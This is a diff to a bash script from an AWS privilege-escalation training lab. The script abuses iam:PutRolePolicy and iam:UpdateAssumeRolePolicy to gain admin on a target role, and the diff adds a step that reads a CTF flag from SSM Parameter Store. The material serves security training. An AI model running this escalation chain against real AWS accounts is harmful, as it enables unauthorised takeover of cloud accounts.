@@ -345,12 +345,28 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 13: Capture the CTF flag
+# We are still operating as the assumed target role session, which holds the admin inline policy.
+# That policy grants Action=* on Resource=*, so ssm:GetParameter is available.
+echo -e "${YELLOW}Step 13: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-021-to-admin"
+show_attack_cmd "Attacker (target role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (no admin permissions, no sts:AssumeRole permission)"
@@ -358,11 +374,13 @@ echo "2. Used iam:PutRolePolicy to add inline admin policy '$INLINE_POLICY_NAME'
 echo "3. Used iam:UpdateAssumeRolePolicy to modify trust policy of: $TARGET_ROLE"
 echo "4. Assumed the role without needing explicit sts:AssumeRole permission (named principal in trust)"
 echo "5. Achieved: Full administrative access to the AWS account"
+echo "6. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (PutRolePolicy) → $TARGET_ROLE (admin policy)"
 echo "  → (UpdateAssumeRolePolicy) → $TARGET_ROLE trust"
 echo "  → (AssumeRole) → Admin Access"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
